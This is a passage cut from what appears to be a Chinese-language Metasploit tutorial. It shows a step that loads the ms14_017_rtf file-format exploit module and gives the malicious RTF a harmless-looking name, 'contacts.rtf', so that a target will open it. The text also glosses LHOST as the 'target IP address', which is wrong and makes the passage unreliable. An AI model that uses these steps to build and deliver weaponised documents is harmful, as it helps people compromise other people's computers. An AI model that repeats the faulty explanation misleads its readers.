    \ LHOST（目标 IP 地址）。\n\n### 第 4 步：为漏洞命名\n\n选择一个目标会分配给富文本文件的任何适当文件名。在案例中，我们将使用 ‘*contacts.rtf*’。我们将使用此命令分配文件名：\n\
    \n`msf > use exploit/windows/fileformat/ms14_017_rtf`\n`msf exploit(ms14_017_rtf)\
    \ > set FILENAME contacts.rtf`\n`FILENAME => contacts.rtf`\n`msf exploit(ms14_017_rtf)\
